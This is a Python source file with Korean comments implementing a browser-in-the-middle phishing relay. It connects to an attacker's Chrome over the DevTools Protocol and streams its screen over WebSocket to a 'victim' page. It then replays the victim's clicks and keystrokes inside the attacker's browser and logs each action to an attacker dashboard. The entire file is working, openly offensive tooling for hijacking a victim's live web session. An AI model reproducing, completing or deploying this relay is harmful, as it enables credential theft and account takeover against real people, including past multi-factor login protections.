import asyncio
import base64
import json
import websockets
from playwright.async_api import async_playwright

# 세션별 소켓 및 브라우저 상태 관리
sessions = {}  # { session_id: { "victim": ws, "attacker": ws } }
attacker_browser_page = None

async def capture_and_broadcast(session_id):
    """
    공격자 크롬 브라우저(CDP)의 화면을 0.1초마다 캡처하여 
    해당 세션에 연결된 '피해자'와 '공격자' 모두에게 실시간 스트리밍합니다.
    """
    global attacker_browser_page
    while session_id in sessions:
        if attacker_browser_page:
            try:
                # 1. 브라우저 화면 PNG 캡처
                screenshot_bytes = await attacker_browser_page.screenshot(type="png")
                encoded_frame = base64.b64encode(screenshot_bytes).decode("utf-8")
                message = json.dumps({"type": "frame", "data": encoded_frame})
                
                # 2. 피해자에게 화면 전송
                if sessions[session_id].get("victim"):
                    await sessions[session_id]["victim"].send(message)
                
                # 3. 공격자 대시보드에게도 동일 화면 전송
                if sessions[session_id].get("attacker"):
                    await sessions[session_id]["attacker"].send(message)
            except Exception as e:
                print(f"[에러] 화면 스트리밍 실패: {e}")
        
        await asyncio.sleep(0.1)

async def handler(websocket, path):
    """
    URL 경로(/victim 또는 /attacker)에 따라 클라이언트를 구분하고 
    데이터를 상호 중계하는 핵심 핸들러
    """
    global attacker_browser_page
    
    try:
        # 경로 및 세션 ID 파싱 (예: /victim?session=123)
        if "/victim" in path:
            session_id = path.split("=")[-1]
            if session_id not in sessions:
                sessions[session_id] = {}
            sessions[session_id]["victim"] = websocket
            print(f"[연결] 피해자 접속 완료 (세션: {session_id})")
            
            async for message in websocket:
                event = json.loads(message)
                
                # 피해자의 입력(클릭/키보드)을 공격자 브라우저(CDP)에 직접 반영
                if attacker_browser_page:
                    if event.get("type") == "click":
                        x = event.get("x")
                        y = event.get("y")
                        await attacker_browser_page.mouse.click(x, y)
                    elif event.get("type") == "keypress":
                        char = event.get("char")
                        await attacker_browser_page.keyboard.press(char)
                
                # 공격자 대시보드에 로그 전달
                if sessions[session_id].get("attacker"):
                    await sessions[session_id]["attacker"].send(json.dumps({
                        "type": "log",
                        "content": f"피해자 액션 발생: {event.get('type')}"
                    }))

        elif "/attacker" in path:
            session_id = path.split("=")[-1]
            if session_id not in sessions:
                sessions[session_id] = {}
            sessions[session_id]["attacker"] = websocket
            print(f"[연결] 공격자 대시보드 접속 완료 (세션: {session_id})")
            
            async for message in websocket:
                # 공격자 측에서 추가 명령이 올 경우 처리 가능
                pass
                
        await asyncio.Future()
        
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        # 연결 종료 시 정리
        for sid, client in list(sessions.items()):
            if client.get("victim") == websocket:
                client["victim"] = None
                print(f"[해제] 피해자 연결 종료 (세션: {sid})")
            if client.get("attacker") == websocket:
                client["attacker"] = None
                print(f"[해제] 공격자 연결 종료 (세션: {sid})")

async def main():
    global attacker_browser_page
    async with async_playwright() as p:
        try:
            # 공격자 로컬 PC에 띄워둔 크롬 브라우저에 CDP로 접속 (--remote-debugging-port=9222)
            browser = await p.chromium.connect_over_cdp("http://localhost:9222")
            contexts = browser.contexts
            if contexts and contexts[0].pages:
                attacker_browser_page = contexts[0].pages[0]
            else:
                context = await browser.new_context()
                attacker_browser_page = await context.new_page()
            print("[*] 공격자 로컬 브라우저(CDP)와 성공적으로 연동되었습니다.")
        except Exception as e:
            print(f"[치명적 에러] 크롬 원격 디버깅 포트(9222)에 연결할 수 없습니다: {e}")
            return

        # 123번 세션에 대한 화면 스트리밍 태스크 시작
        asyncio.create_task(capture_and_broadcast("123"))

        # 웹소켓 서버 구동 (포트 8080)
        async with websockets.serve(handler, "localhost", 8080):
            print("[*] 3계층 통합 중계 서버가 ws://localhost:8080 에서 실행 중입니다.")
            await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())